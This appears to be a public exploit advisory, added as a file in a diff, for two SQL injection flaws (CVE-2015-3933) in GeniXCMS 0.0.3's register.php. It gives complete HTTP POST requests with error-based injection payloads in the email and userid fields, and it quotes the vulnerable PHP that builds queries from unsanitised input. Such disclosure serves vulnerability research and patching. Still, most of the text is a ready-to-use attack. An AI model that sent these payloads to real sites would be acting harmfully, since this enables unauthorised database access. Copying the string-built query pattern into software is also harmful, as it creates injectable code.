@@ -1,0 +1,100 @@
+# Exploit Title: Genixcms register.php multiple SQL vuln
+# Date: 2015-06-23
+# Exploit Author: cfreer (poc-lab)
+# Vendor Homepage:  http://www.genixcms.org
+# Software Link: https://codeload.github.com/semplon/GeniXCMS/zip/master/GeniXCMS-master.zip
+# Version: 0.0.3
+# Tested on: Apache/2.4.7 (Win32) 
+# CVE : CVE-2015-3933
+
+
+=====================
+SOFTWARE DESCRIPTION
+=====================
+
+Free and Opensource Content Management System, a new approach of simple and lightweight CMS. Get a new experience of a fast and easy to modify CMS.
+
+=============================
+VULNERABILITY: SQL Injection
+=============================
+
+
+
+Poc：
+
+1、Genixcms register.php email SQL vuln
+
+HTTP Data Stream
+
+POST /genixcms/register.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: ECS[visit_times]=4; iAv6_2132_saltkey=JLrHe7OQ; PHPSESSID=r7o8e5rghc0n0j09i6drb4m9v6; GeniXCMS=8fq1peiv9lahvq3d1qlfab7g47
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 199
+
+email='and(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and'&pass1=cfreer&pass2=cfreer&register=1&token=&userid=poc-lab
+
+
+
+
+\inc\lib\User.class.php
+
+
+public static function is_email($vars){
+    if(isset($_GET['act']) && $_GET['act'] == 'edit'){
+        $where = "AND `id` != '{$_GET['id']}' ";
+    }else{
+        $where = '';
+    }
+    $e = Db::result("SELECT * FROM `user` WHERE `email` = '{$vars}' {$where}");
+    if(Db::$num_rows > 0){
+        return false;
+    }else{
+        return true;
+    }
+}
+
+
+
+==============================================================================================================================================
+2、Genixcms register.php userid SQL vuln
+
+HTTP Data Stream
+
+POST /genixcms/register.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: ECS[visit_times]=4; iAv6_2132_saltkey=JLrHe7OQ; PHPSESSID=r7o8e5rghc0n0j09i6drb4m9v6; GeniXCMS=8fq1peiv9lahvq3d1qlfab7g47
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 224
+
+
+email=websec@poc-lab.org&pass1=poc-lab.org&pass2=poc-lab.org&register=1&token=&userid='and(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and'
+
+
+\inc\lib\User.class.php
+
+public static function is_exist($user) {
+if(isset($_GET['act']) && $_GET['act'] == 'edit'){
+    $where = "AND `id` != '{$_GET['id']}' ";
+    }else{
+        $where = '';
+    }
+    $usr = Db::result("SELECT `userid` FROM `user` WHERE `userid` = '{$user}' {$where} ");
+    $n = Db::$num_rows;
+    if($n > 0 ){
+        return false;
+    }else{
+        return true;
+    }
+
+}
